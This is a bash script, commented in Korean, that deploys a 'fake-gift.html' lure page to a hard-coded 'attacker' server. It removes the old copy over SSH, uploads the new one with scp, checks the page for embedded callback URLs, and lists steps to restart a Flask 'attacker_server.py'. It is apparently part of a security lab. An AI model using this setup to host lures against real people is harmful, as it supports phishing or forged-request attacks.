#!/bin/bash

# Attacker 서버 청소 및 업데이트 스크립트
# 사용법: ./update_attacker_server.sh

echo "============================================================"
echo "🧹 Attacker 서버 청소 및 업데이트"
echo "============================================================"

ATTACKER_IP="13.158.67.78"
SSH_KEY="$HOME/.ssh/id_rsa"
LOCAL_FAKE_GIFT="reports/fake-gift.html"

# 1. fake-gift.html이 로컬에 있는지 확인
if [ ! -f "$LOCAL_FAKE_GIFT" ]; then
    echo "❌ 오류: $LOCAL_FAKE_GIFT 파일이 없습니다."
    echo "먼저 python3 auto.py를 실행해서 파일을 생성하세요."
    exit 1
fi

echo ""
echo "✅ 로컬 fake-gift.html 확인됨: $LOCAL_FAKE_GIFT"
echo ""

# 2. Attacker 서버의 기존 파일 삭제
echo "🗑️  Attacker 서버의 기존 fake-gift.html 삭제 중..."
ssh -i "$SSH_KEY" ubuntu@"$ATTACKER_IP" << 'EOF'
    echo "현재 디렉토리: $(pwd)"

    # 기존 fake-gift.html 삭제
    if [ -f fake-gift.html ]; then
        echo "✅ 기존 fake-gift.html 발견 - 삭제 중..."
        rm -f fake-gift.html
        echo "✅ 삭제 완료"
    else
        echo "ℹ️  기존 fake-gift.html 없음 (괜찮음)"
    fi

    # attacker_server.py 확인
    if [ -f attacker_server.py ]; then
        echo "✅ attacker_server.py 확인됨"
    else
        echo "⚠️  경고: attacker_server.py가 없습니다!"
    fi
EOF

echo ""
echo "📤 새로운 fake-gift.html 업로드 중..."

# 3. 새로운 fake-gift.html 업로드
scp -i "$SSH_KEY" "$LOCAL_FAKE_GIFT" ubuntu@"$ATTACKER_IP":~/

if [ $? -eq 0 ]; then
    echo "✅ 업로드 완료!"
else
    echo "❌ 업로드 실패!"
    exit 1
fi

echo ""
echo "🔍 Attacker 서버 파일 확인 중..."

# 4. 업로드된 파일 확인
ssh -i "$SSH_KEY" ubuntu@"$ATTACKER_IP" << 'EOF'
    echo ""
    echo "📂 현재 디렉토리 파일 목록:"
    ls -lh fake-gift.html attacker_server.py 2>/dev/null || echo "일부 파일 없음"

    echo ""
    echo "📝 fake-gift.html 내용 미리보기 (처음 5줄):"
    head -5 fake-gift.html

    echo ""
    echo "🔍 fake-gift.html 안의 IP 주소 확인:"
    grep -o "http://[0-9.:]*/[^'\"]*" fake-gift.html | head -5
EOF

echo ""
echo "============================================================"
echo "✅ 업데이트 완료!"
echo "============================================================"
echo ""
echo "다음 단계:"
echo "1. Attacker 서버에서 Flask 서버가 실행 중인지 확인:"
echo "   ssh -i $SSH_KEY ubuntu@$ATTACKER_IP"
echo "   ps aux | grep attacker_server.py"
echo ""
echo "2. Flask 서버 재시작 (필요시):"
echo "   pkill -f attacker_server.py"
echo "   python3 attacker_server.py"
echo ""
echo "3. 브라우저에서 테스트:"
echo "   http://$ATTACKER_IP:5000/fake-gift"
echo ""
